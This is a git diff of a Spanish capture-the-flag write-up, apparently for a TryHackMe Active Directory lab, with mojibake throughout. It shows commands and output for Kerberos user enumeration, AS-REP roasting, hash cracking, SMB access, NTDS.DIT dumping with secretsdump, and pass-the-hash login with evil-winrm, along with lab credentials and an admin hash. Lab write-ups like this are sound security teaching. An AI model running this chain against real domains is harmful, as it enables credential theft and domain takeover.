@@ -38,7 +38,7 @@ Fecha: 2026-03-15
 Lo primero que realizaremos sera una enumeraci├│n de los puertos abiertos y de los servicios que corren en la maquina.
 
 ```bash
-¯é▒ gomap -s -p - $TARGET
+é▒ gomap -s -p - $TARGET
 
   ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
@@ -47,7 +47,7 @@ Lo primero que realizaremos sera una enumeraci├│n de los puertos abiertos y 
  ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
   ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
 
-­ƒÄ» Scanning 10.112.160.217 (65535 ports, CONNECT scan)
+­ Scanning 10.112.160.217 (65535 ports, CONNECT scan)
 
 PORT    STATE  SERVICE         VERSION
 53      open   domain          
@@ -96,7 +96,7 @@ Los puertos a tener en cuenta son:
 Vamos a proceder a una enumeraci├│n de los puertos *139 y 445* con la herramienta **enum4linux**.
 
 ```bash
-¯é▒ enum4linux -U $TARGET
+é▒ enum4linux -U $TARGET
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 15 12:26:24 2026
 
  =========================================( Target Information )=========================================
@@ -156,7 +156,7 @@ Ademas del nombre dominio de la maquina:
 Para hacer una enumeraci├│n mas fina tenemos que a├▒adir a nuestro */etc/host* la **IP** y el nombre de dominio **THM-AD** y **spookysec.local**.
 
 ```bash
-¯é▒ sudo nano /etc/hosts
+é▒ sudo nano /etc/hosts
 
 127.0.0.1       localhost
 127.0.1.1       kali-box
@@ -172,7 +172,7 @@ ff02::2 ip6-allrouters
 Ahora usaremos **kerbrute** para enumerar usuarios.
 
 ```bash
-¯é▒ ./kerbrute userenum -d spookysec.local --dc $TARGET userlist.txt
+é▒ ./kerbrute userenum -d spookysec.local --dc $TARGET userlist.txt
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -236,7 +236,7 @@ ROBIN
 Usaremos esta lista para ver que usuarios tienen la debilidad de AS-REP Roasting, que gira en torno a tener deshabilitada la preautenticaci├│n Kerberos, lo que permite pedir el ticket **sin contrase├▒a** y luego crackearlo offline.
 
 ```bash
-¯é▒ ´Çî   python3 ../Repos/impacket/examples/GetNPUsers.py -no-pass -request -usersfile user.txt -dc-ip $TARGET spookysec.local/
+é▒ ´Çî   python3 ../Repos/impacket/examples/GetNPUsers.py -no-pass -request -usersfile user.txt -dc-ip $TARGET spookysec.local/
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -262,7 +262,7 @@ Con esto obtenemos el has del usuario **svc-admin**.
 Vamos a proceder a comprometer la contrase├▒a.
 
 ```bash
-¯é▒ hashcat -m 18200 scv.admin.txt passwordlist.txt 
+é▒ hashcat -m 18200 scv.admin.txt passwordlist.txt 
 hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -331,7 +331,7 @@ Con esto ya tenemos la combinaci├│n para acceder al sistema.
 Con estas credenciales podremos enumerar con mas facilidad con las herramientas que tenemos y obtener todos los datos que necesitamos.
 
 ```bash
- ¯é▒ smbclient -L //$TARGET -U svc-admin%management2005
+ é▒ smbclient -L //$TARGET -U svc-admin%management2005
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -351,7 +351,7 @@ Con **smbcliente** vemos el listado de recursos compartidos que tiene el servido
 Veamos que hay dentro.
 
 ```bash
-¯é▒ smbclient //$TARGET/backup/ -U svc-admin%management2005 
+é▒ smbclient //$TARGET/backup/ -U svc-admin%management2005 
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Sat Apr  4 21:08:39 2020
@@ -372,7 +372,7 @@ smb: \>
 Una vez la tengamos en el equipo podremos decodificar su contenido para ver que hay dentro.
 
 ```bash
-¯é▒ cat backup_credentials.txt | base64 -d          
+é▒ cat backup_credentials.txt | base64 -d          
 backup@spookysec.local:backup2517860   
 ```
 
@@ -383,11 +383,11 @@ Veamos que podemos encontrar.
 Para este fin usaremos `impacket-secretsdump` el cual nos permitir├í obtener el contenido de `NTDS.DIT`
 
 ```bash
-¯é▒ echo $TARGET        
+é▒ echo $TARGET        
 10.112.160.217
 
 
-¯é▒ impacket-secretsdump spookysec.local/backup:backup2517860@10.112.160.217      
+é▒ impacket-secretsdump spookysec.local/backup:backup2517860@10.112.160.217      
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -473,7 +473,7 @@ Sigamos con la intrusi├│n.
 Ahora nos conectaremos como el usuario `Adminstrator` usando la herramienta **evil-winrm**.
 
 ```bash
-¯é▒ evil-winrm -i 10.112.160.217 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+é▒ evil-winrm -i 10.112.160.217 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
 Evil-WinRM shell v3.9
 
@@ -490,3 +490,4 @@ Ahora nos dispondremos a investigar para completar las flags de Try Hack Me para
 Pero para ser una intrusi├│n podr├¡amos dejarlo aqu├¡.
 
 El laboratorio es interesante y se aprende mucho con el.
+
